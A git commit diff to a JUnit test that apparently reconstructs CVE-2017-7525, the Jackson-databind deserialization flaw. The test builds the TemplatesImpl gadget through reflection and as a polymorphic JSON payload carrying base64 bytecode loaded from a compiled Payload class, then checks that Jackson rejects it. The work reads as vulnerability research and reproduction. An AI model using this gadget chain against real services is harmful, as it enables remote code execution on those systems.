860b2b552e613a1e71cc7b393fc657047724c543
Thomas Heilbronner <thomas.heilbronner@gmail.com>
2018-02-10 18:43:42 +0100

    trying to re-construct the bug

--- java/cve/2017-7525/src/test/java/sample/Runner.java
+++ java/cve/2017-7525/src/test/java/sample/Runner.java
@@ -1,25 +1,27 @@
 package sample;
 
-import static org.junit.jupiter.api.Assertions.assertThrows;
-
-import java.io.BufferedReader;
-import java.io.IOException;
-import java.io.InputStreamReader;
-import java.net.HttpURLConnection;
-import java.net.URL;
-import java.nio.file.Files;
-import java.nio.file.Path;
-import java.nio.file.Paths;
-import java.util.Base64;
-
+import com.fasterxml.jackson.databind.ObjectMapper;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import org.assertj.core.api.Assertions;
 import org.junit.jupiter.api.AfterEach;
 import org.junit.jupiter.api.BeforeEach;
 import org.junit.jupiter.api.Test;
-
-import com.fasterxml.jackson.databind.ObjectMapper;
-
 import spark.Spark;
+
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.Base64;
+
+import static org.junit.jupiter.api.Assertions.assertThrows;
 
 class Runner {
 
@@ -32,7 +34,6 @@ class Runner {
         public int id;
         public Object obj;
     }
-
 
     @BeforeEach
     void setUp() {
@@ -68,25 +69,46 @@ class Runner {
         System.out.println(result);
     }
 
-    @Test
-    void name() throws IOException {
-        Path absolute = Paths.get("out/test/classes/sample/Payload.class");
-        byte[] bytes = Files.readAllBytes(absolute);
+	@Test
+	void directlyTestExecution() throws IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, NoSuchFieldException {
+		TemplatesImpl templates = new TemplatesImpl();
+
+		Field field = templates.getClass().getDeclaredField("_tfactory");
+		field.setAccessible(true);
+		field.set(templates, new TransformerFactoryImpl());
+		Method transletName = templates.getClass().getDeclaredMethod("setTransletName", String.class);
+		transletName.setAccessible(true);
+		transletName.invoke(templates, "a.b");
+		byte[] bytes = byteCode();
+		byte[][] baba = {bytes};
+
+		Method method = templates.getClass().getDeclaredMethod("setTransletBytecodes", baba.getClass());
+
+		method.setAccessible(true);
+		method.invoke(templates, (Object) baba);
+
+		templates.getOutputProperties();
+	}
+
+	@Test
+    void viaObjectMapper() throws IOException {
+		byte[] bytes = byteCode();
         String base64Encoded = Base64.getEncoder().encodeToString(bytes);
         System.out.println(base64Encoded);
 
 
         String payload = "AAIAZQ==";
         payload = base64Encoded;
-        final String JSON = "{\"id\": 124,\n" +
-                " \"obj\":[ \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\n" +
-                "  {\n" +
-                "    \"transletBytecodes\" : [ \"" + payload + "\" ],\n" +
-                "    \"transletName\" : \"a.b\",\n" +
-                "    \"outputProperties\" : { }\n" +
-                "  }\n" +
-                " ]\n" +
-                "}";
+		//language=JSON
+		final String JSON = "{\"id\": 124,\n" +
+				" \"obj\":[ \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\n" +
+				"  {\n" +
+				"    \"transletBytecodes\" : [ \"" + payload + "\" ],\n" +
+				"    \"transletName\" : \"a.b\",\n" +
+				"    \"outputProperties\" : { }\n" +
+				"  }\n" +
+				" ]\n" +
+				"}";
         ObjectMapper mapper = new ObjectMapper();
         mapper.enableDefaultTyping();
 
@@ -97,4 +119,8 @@ class Runner {
                 .hasMessageContaining("to deserialize")
                 .hasMessageContaining("prevented for security reasons");
     }
+
+	private byte[] byteCode() throws IOException {
+		return Files.readAllBytes(Paths.get("out/test/classes/sample/Payload.class"));
+	}
 }
